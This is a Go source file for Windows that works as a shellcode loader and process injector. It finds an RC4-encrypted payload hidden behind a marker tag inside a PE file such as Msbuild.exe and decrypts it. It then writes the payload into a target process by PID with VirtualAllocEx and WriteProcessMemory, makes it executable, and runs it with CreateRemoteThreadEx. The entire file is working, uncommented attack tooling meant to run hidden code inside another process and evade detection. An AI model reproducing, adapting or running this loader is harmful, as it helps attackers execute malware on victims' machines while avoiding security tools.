// +build windows

package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"

	// "syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var _tag = []byte{0xfe, 0xed, 0xfa, 0xce, 0xfe, 0xed, 0xfa, 0xce}

const PAGE_EXECUTE_READ uintptr = 0x20

func scanPattern(_peBytes []byte, pattern []byte) int {
	_max := len(_peBytes) - len(pattern) + 1
	var j int
	for i := 0; i < _max; i++ {
		if _peBytes[i] != pattern[0] {
			continue
		}
		for j = len(pattern) - 1; j >= 1 && _peBytes[i+j] == pattern[j]; j-- {
		}
		if j == 0 {
			return i
		}

	}
	return -1
}
func Decrypt(data []byte, encKey string) []byte {
	keyLen := len(encKey)
	dataLen := len(data)
	var tmp byte
	result := make([]byte, dataLen)
	var j = 0
	var t = 0
	var i = 0
	var S [256]byte
	var T [256]byte

	for i = 0; i < 256; i++ {
		S[i] = uint8(i)
		T[i] = encKey[i%keyLen]
	}

	for i = 0; i < 256; i++ {
		j = (j + int(S[i]) + int(T[i])) % 256
		tmp = S[j]
		S[j] = S[i]
		S[i] = tmp
	}
	j = 0
	for x := 0; x < dataLen; x++ {
		i = (i + 1) % 256
		j = (j + int(S[i])) % 256

		tmp = S[j]
		S[j] = S[i]
		S[i] = tmp

		t = (int(S[i]) + int(S[j])) % 256

		result[x] = data[x] ^ S[t]
	}
	return result
}
func main() {
	pid := flag.Int("pid", 8888, "Process ID to inject shellcode into")
	filepath := flag.String("f", "Msbuild.exe", "input PE filepath")
	encKey := flag.String("e", "Testkey", "input key")
	flag.Parse()
	_peBlob, err := ioutil.ReadFile(*filepath)
	fmt.Println(*filepath)
	if err != nil {
		fmt.Println(err)
	}
	_dataOffset := scanPattern(_peBlob, _tag)
	fmt.Println("the file bytes length is:", len(_peBlob))
	fmt.Println("[+]:Scanning for Shellcode...")
	if _dataOffset == -1 {
		fmt.Println("Could not locate data or shellcode")
	}
	b := bytes.NewReader(_peBlob)
	pos, err := b.Seek(int64(_dataOffset+len(_tag)), io.SeekCurrent)
	fmt.Println("[+]: Shellcode located at {0:x2}", pos)
	data := _peBlob[pos:]
	shellcode := Decrypt(data, *encKey)
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")

	pHandle, errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(*pid))

	if errOpenProcess != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", errOpenProcess.Error()))
	}
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAllocEx failed and returned 0")
	}
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}
	_, _, errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)
	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx:\r\n%s", errCreateRemoteThreadEx.Error()))
	}
	errCloseHandle := windows.CloseHandle(pHandle)
	if errCloseHandle != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
	}

}
